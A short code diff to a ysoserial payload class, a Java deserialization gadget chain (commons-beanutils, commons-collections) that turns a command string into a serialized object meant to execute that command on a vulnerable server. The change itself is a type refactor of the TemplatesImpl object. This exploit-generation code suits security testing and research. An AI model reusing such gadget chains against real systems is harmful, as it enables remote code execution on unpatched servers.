@@ -10,14 +10,12 @@ import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-
-@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
+@SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
 public class CommonsBeanutilsCollectionsLogging1 implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
-		final TemplatesImpl templates = Gadgets.createTemplatesImpl(command);
+		final Object templates = Gadgets.createTemplatesImpl(command);
 		// mock method name until armed
 		final BeanComparator comparator = new BeanComparator("lowestSetBit");
 
